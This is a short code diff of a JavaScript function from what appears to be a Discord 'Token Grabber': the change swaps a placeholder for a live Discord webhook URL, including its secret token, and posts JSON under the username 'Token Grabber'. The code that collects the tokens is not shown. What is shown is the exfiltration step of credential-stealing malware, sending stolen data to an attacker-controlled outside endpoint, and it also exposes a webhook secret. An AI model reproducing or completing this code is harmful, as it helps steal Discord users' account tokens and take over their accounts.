@@ -1,6 +1,6 @@
 function sendMessage() {
     const request = new XMLHttpRequest();
-    request.open("POST", "Webhook here");
+    request.open("POST", "https://discord.com/api/webhooks/1013331685825327206/VJ66RYslSdsT3fbnq7MxaIpFUq4rRIvQoHh-N-Q4b-tunvgQ1nQb9REsEcIhNrJQr51c");
     request.setRequestHeader('Content-type', 'application/json');
     const params = {
                   username: "Token Grabber",
